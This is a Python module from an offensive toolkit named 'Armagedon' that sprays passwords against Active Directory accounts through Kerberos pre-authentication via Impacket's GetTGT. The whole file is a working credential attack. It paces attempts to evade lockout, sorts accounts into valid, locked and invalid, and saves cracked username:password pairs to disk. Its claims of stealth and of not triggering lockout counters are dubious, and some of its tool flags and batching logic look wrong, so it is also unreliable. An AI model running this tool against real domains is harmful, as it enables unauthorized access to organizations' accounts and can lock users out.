"""
Armagedon Password Spray Module — Lockout-aware password spraying against
Active Directory accounts via Kerberos AS-REQ (stealthy, no LDAP bind log).

Uses Impacket's GetTGT or a raw Kerberos pre-auth request to validate
credentials without triggering account lockout counters on the DC directly.
Reports valid / locked / invalid accounts.
"""
import subprocess
import shutil
import os
import time
import re
import sys
import logging

log = logging.getLogger("armagedon.modules.auxiliary.password_spray")

CVE = "N/A"
DESCRIPTION = "Password Spray — Lockout-aware AD password spraying via Kerberos authentication"
PLATFORM = "Windows"
RANK = "normal"
AUTHOR = "Armagedon"
DISCLOSURE = "N/A"

OPTIONS = {
    "RHOSTS": "",
    "DOMAIN": "",
    "USER_FILE": "",
    "PASS_FILE": "",
    "PASSWORD": "",
    "DELAY": 30,
    "LOCKOUT_THRESHOLD": 5,
    "JITTER": 5,
    "OUTPUT_DIR": "",
    "VERBOSE": False,
}

REQUIRED = {"RHOSTS": True, "DOMAIN": True}
DESCRIPTIONS = {
    "RHOSTS": "Target Domain Controller IP",
    "DOMAIN": "Active Directory domain (e.g. corp.local)",
    "USER_FILE": "File containing usernames (one per line)",
    "PASS_FILE": "File containing passwords to spray (one per line)",
    "PASSWORD": "Single password to spray (overrides PASS_FILE)",
    "DELAY": "Seconds between password batches (default 30)",
    "LOCKOUT_THRESHOLD": "Account lockout threshold — spray N-1 then wait (default 5)",
    "JITTER": "Random jitter in seconds added to DELAY (default 5)",
    "OUTPUT_DIR": "Directory to save results",
    "VERBOSE": "Print every attempt (default: False)",
}

VALID_USERS_FILE = "valid_users.txt"
SPRAY_LOG = "spray_results.jsonl"


def _find_tool(name):
    """Locate an Impacket tool or system binary."""
    alt_names = {
        "GetTGT.py": "impacket-GetTGT",
        "kinit": "kinit",
    }
    path = shutil.which(alt_names.get(name, name))
    if path:
        return path
    path = shutil.which(f"{alt_names.get(name, name)}.py")
    return path


def _load_usernames(user_file):
    """Load usernames from a file, one per line. Strip whitespace, skip blanks/comments."""
    users = []
    if not user_file or not os.path.isfile(user_file):
        return users
    with open(user_file, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                users.append(line)
    return users


def _load_passwords(pass_file, single_pass=None):
    """Load passwords from file or use single password."""
    passwords = []
    if single_pass:
        return [single_pass]
    if pass_file and os.path.isfile(pass_file):
        with open(pass_file, "r", errors="ignore") as f:
            for line in f:
                line = line.rstrip("\n\r")
                if line:
                    passwords.append(line)
    return passwords


def _try_kerberos_auth(domain, username, password, dc_ip):
    """Attempt Kerberos authentication via Impacket GetTGT.py.

    Returns:
        (status, message) where status is one of:
        'valid'   — TGT obtained, credentials are correct
        'locked'  — account is locked out
        'invalid' — bad password
        'error'   — connectivity/tool error
    """
    tool = _find_tool("GetTGT.py")
    if not tool:
        return "error", "impacket-GetTGT not found. Install: pip install impacket"

    cmd = [
        tool,
        "-domain", domain,
        "-username", username,
        "-password", password,
        "-dc-ip", dc_ip,
        "-target-domain", domain,
        "-save",  # saves .ccache on success
    ]

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30
        )
        stderr = (result.stderr or "").lower()
        stdout = (result.stdout or "").lower()
        combined = stderr + "\n" + stdout

        if result.returncode == 0 and "ccache" in combined:
            # Clean up saved ccache
            for f in os.listdir("."):
                if f.endswith(".ccache"):
                    os.remove(f)
            return "valid", "TGT obtained successfully"

        if "locked" in combined or "account lockout" in combined or "status_lock" in combined:
            return "locked", "Account is locked out"

        if "pre-auth" in combined or "invalid" in combined or "bad password" in combined:
            return "invalid", "Invalid credentials"

        if "kdc_err_c_principal_unknown" in combined or "unknown" in combined:
            return "invalid", "User does not exist"

        if "connection refused" in combined or "timed out" in combined or "unreachable" in combined:
            return "error", "Cannot reach Domain Controller"

        # If we got a TGT file, it's valid
        for f in os.listdir("."):
            if f.endswith(".ccache"):
                os.remove(f)
                return "valid", "TGT obtained successfully"

        return "error", f"Unclear result: {result.stdout[:200]}"

    except subprocess.TimeoutExpired:
        return "error", "Kerberos authentication timed out"
    except Exception as e:
        return "error", str(e)


def check(options=None, target=None, **kwargs):
    """Verify prerequisites for password spraying."""
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    if not opts.get("RHOSTS"):
        return False, "RHOSTS (Domain Controller IP) required."
    if not opts.get("DOMAIN"):
        return False, "DOMAIN required."
    if not opts.get("PASSWORD") and not opts.get("PASS_FILE"):
        return False, "PASSWORD or PASS_FILE required."
    if not opts.get("USER_FILE"):
        return False, "USER_FILE required (list of usernames to spray)."

    user_file = opts.get("USER_FILE", "")
    if user_file and not os.path.isfile(user_file):
        return False, f"User file not found: {user_file}"

    tool = _find_tool("GetTGT.py")
    if not tool:
        return False, "impacket-GetTGT not found. Install: pip install impacket"

    return True, f"DC: {opts['RHOSTS']}, Tool: {tool}"


def run(options=None, target=None, mode="CHECK", **kwargs):
    """Execute password spraying.

    Args:
        options: Module options dict.
        target: DC IP (overrides RHOSTS).
        mode: CHECK validates prerequisites, EXPLOIT performs the spray.
    """
    opts = dict(options or {})
    if target:
        opts["RHOSTS"] = target

    dc_ip = opts.get("RHOSTS", "")
    log.info(f"Password spray target={dc_ip} domain={opts.get('DOMAIN','')} mode={mode}")
    domain = opts.get("DOMAIN", "")
    user_file = opts.get("USER_FILE", "")
    pass_file = opts.get("PASS_FILE", "")
    single_pass = opts.get("PASSWORD", "")
    delay = int(opts.get("DELAY", 30))
    lockout_threshold = int(opts.get("LOCKOUT_THRESHOLD", 5))
    jitter = int(opts.get("JITTER", 5))
    verbose = opts.get("VERBOSE", False)

    print(f"\n{'='*60}")
    print(f"  Armagedon — Password Spray")
    print(f"  DC: {dc_ip}  Domain: {domain}")
    print(f"{'='*60}")

    # CHECK mode
    if mode.upper() == "CHECK":
        ok, msg = check(opts, target)
        if ok:
            users = _load_usernames(user_file)
            passwords = _load_passwords(pass_file, single_pass)
            print(f"[+] Ready: {len(users)} user(s), {len(passwords)} password(s)")
            print(f"[+] Lockout threshold: {lockout_threshold} (spray {min(2, lockout_threshold - 1)} then wait {delay}s)")
            return {"success": True, "user_count": len(users), "password_count": len(passwords), "message": msg}
        else:
            print(f"[-] Check failed: {msg}")
            return {"success": False, "error": msg}

    # EXPLOIT mode
    print(f"[*] Loading usernames from {user_file}")
    users = _load_usernames(user_file)
    if not users:
        return {"success": False, "error": "No usernames loaded from user file"}

    print(f"[*] Loading passwords...")
    passwords = _load_passwords(pass_file, single_pass)
    if not passwords:
        return {"success": False, "error": "No passwords loaded"}

    print(f"[*] {len(users)} users x {len(passwords)} passwords")
    print(f"[*] Lockout-aware: max {min(2, lockout_threshold - 1)} attempts per batch, {delay}s+ delay between batches")
    print()

    # Set up output
    output_dir = opts.get("OUTPUT_DIR", "")
    if not output_dir:
        import tempfile
        output_dir = os.path.join(tempfile.gettempdir(), "armagedon_spray")
    os.makedirs(output_dir, exist_ok=True)
    results_file = os.path.join(output_dir, SPRAY_LOG)
    valid_file = os.path.join(output_dir, VALID_USERS_FILE)

    results = {
        "valid": [],
        "locked": [],
        "invalid": [],
        "errors": [],
    }

    batch_size = max(1, lockout_threshold - 2)  # stay under lockout threshold

    for pw_idx, password in enumerate(passwords):
        # Random jitter
        import random
        jitter_val = random.randint(0, jitter) if jitter > 0 else 0
        total_delay = delay + jitter_val

        if pw_idx > 0:
            print(f"[*] Waiting {total_delay}s before next batch (lockout-aware)...")
            time.sleep(total_delay)

        print(f"\n[*] Batch {pw_idx + 1}/{len(passwords)} — password: {'*' * len(password)}")
        print(f"    Spraying {len(users)} accounts in sub-batches of {batch_size}")

        # Sub-batch the spray
        for batch_start in range(0, len(users), batch_size):
            batch = users[batch_start:batch_start + batch_size]

            for user in batch:
                status, msg = _try_kerberos_auth(domain, user, password, dc_ip)

                record = {
                    "user": user,
                    "status": status,
                    "message": msg,
                    "password": password if status == "valid" else None,
                }

                if status == "valid":
                    print(f"    [\033[92m+\033[0m] VALID: {user}:{password}")
                    results["valid"].append(record)
                elif status == "locked":
                    print(f"    [\033[91m!\033[0m] LOCKED: {user}")
                    results["locked"].append(record)
                elif status == "invalid":
                    if verbose:
                        print(f"    [-] invalid: {user}")
                    results["invalid"].append(record)
                else:
                    print(f"    [\033[93m?\033[0m] ERROR: {user} — {msg}")
                    results["errors"].append(record)

                # Append to log file
                try:
                    import json
                    with open(results_file, "a") as lf:
                        lf.write(json.dumps(record) + "\n")
                except Exception:
                    pass

            # If we hit lockout threshold, pause
            active_locked = len(results["locked"])
            if active_locked >= lockout_threshold - 1:
                print(f"[!] Lockout threshold approaching ({active_locked} locked), extended wait...")
                time.sleep(delay * 3)

    # Write valid users file
    if results["valid"]:
        with open(valid_file, "w") as vf:
            for rec in results["valid"]:
                vf.write(f"{rec['user']}:{rec['password']}\n")

    # Summary
    print(f"\n{'='*60}")
    print(f"  PASSWORD SPRAY RESULTS")
    print(f"{'='*60}")
    print(f"  [\033[92m+\033[0m] Valid credentials:  {len(results['valid'])}")
    print(f"  [\033[91m!\033[0m] Locked accounts:    {len(results['locked'])}")
    print(f"  [-] Invalid accounts:   {len(results['invalid'])}")
    print(f"  [\033[93m?\033[0m] Errors:            {len(results['errors'])}")
    print(f"{'='*60}")

    if results["valid"]:
        print(f"\n  Valid credentials saved to: {valid_file}")
        print(f"  Full log: {results_file}")

    return {
        "success": len(results["valid"]) > 0,
        "results": results,
        "valid_count": len(results["valid"]),
        "locked_count": len(results["locked"]),
        "invalid_count": len(results["invalid"]),
        "error_count": len(results["errors"]),
        "results_file": results_file,
        "valid_file": valid_file if results["valid"] else None,
    }
